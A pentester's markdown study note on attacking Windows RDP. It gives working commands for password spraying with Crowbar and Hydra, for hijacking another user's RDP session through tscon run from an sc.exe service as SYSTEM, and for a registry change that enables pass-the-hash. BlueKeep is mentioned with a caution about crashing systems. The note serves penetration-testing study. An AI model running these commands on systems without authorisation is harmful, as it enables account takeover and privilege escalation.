\\# Basics
- RDP uses port `TCP/3389`
- nmap will return RDP as `ms-wbt-server`

## Misconfigurations
### Weak passwords - Password guessing/spraying

#### Crowbar - RDP Password Spraying
``` bash
crowbar -b rdp -s <IP>/32 -U users.txt -c 'password123'
```
#### Hyrda - RDP Password Spraying
``` bash
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

## Protocol Specific Attacks

### RDP Session Hijacking
- If we gain access to a machine and have an account with local admin privs
	- And is a user is connected via RDP to the compromised machine
		- We can hijack the user's RDP session to escalate privs and impersonate the account. In an AD environment, this could lead to taking over a Domain Admin account or other further access.

In the example below we are logged in as the use `juurena` (ID 2) who has Admin privs. Our goal is to hijack `lewen` (ID 4) who is also logged in via RDP.
![[Pasted image 20230404132714.jpg|700]]
- To successfully impersonate this user without their password:
	- We need `SYSTEM` privileges
	- We need to use the Microsoft [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) binary that enables users to connect to another desktop sessions.
	
-  tscon works by specifying which **Session ID** (4 for the lewen session in the example) we would like to connect to which **Session Name** (`rdp-tcp#13`, is the current session)
	- To open a new console as the specified **SESSION_ID** within our current RDP session
``` cmd
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
``` 

- To get System privs from local admin privs we could use `PsExec` or `Mimikatz`
- A simple trick is to create a windows service that by default will run as Local System and will execute any binary with System prics
- We will use [Microsoft sc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create)
	- First we specificy the service name (`sessionhijack`) and the `binpath`, which is the command we want to execute.
	- The following command example creates a service named sessionhijack
		- `sc.exe create sessionhijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#0"`
	- To run the command we start the service
		- `net start sessionhijack`
	- Once started a new terminal with the _lewen_ user should appear.
- _Note: This method no longer works on Server 2019._

### RDP Pass the Hash
- Restricted admin mode, should be enabled on the target otherwise we get an error "Account restrictions are preventing this user from signing in"
	- Use this command to add the Registry Key needed:
``` cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
- Then use the `/pth:` flag on xfreerdp

### Latest Vulns
[Bluekeep](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708)
Â Note: This is a flaw that we will likely run into during our penetration tests, but it can cause system instability, including a "blue screen of death (BSoD)," and we should be careful before using the associated exploit. If in doubt, it's best to first speak with our client so they understand the risks and then decide if they would like us to run the exploit or not.